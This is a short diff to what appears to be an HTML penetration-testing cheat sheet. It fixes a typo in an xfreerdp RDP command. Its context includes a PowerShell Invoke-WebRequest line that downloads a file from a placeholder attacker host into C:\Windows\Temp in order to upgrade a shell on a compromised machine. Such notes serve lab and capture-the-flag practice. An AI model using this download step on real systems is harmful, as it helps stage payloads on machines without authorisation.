@@ -15,7 +15,7 @@ There is a :
 <h2 align='center' id='n1'><em>Commands</em></h2> 
 <h3>Remote Desktop Protocol (rdp)</h3>
   <code>xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:&lt;MACHINE_IP> /u:&lt;User> /p:&lt;'Password'></code>
-  <p><code>xfreerdp /v:&lt;IP> /u:&lt;Username> /p:&lt;Password> +clipboard<></code>
+  <p><code>xfreerdp /v:&lt;IP> /u:&lt;Username> /p:&lt;Password> +clipboard</code>
 	
 <h3>To get stable shell from unstable from PowerShell</h3>
   <code>powershell -c "Invoke-WebRequest -Uri 'http://&lt;IP>:&lt;PORT>/&lt;filename>' -OutFile 'C:\Windows\Temp\&lt;filename>'"</code>
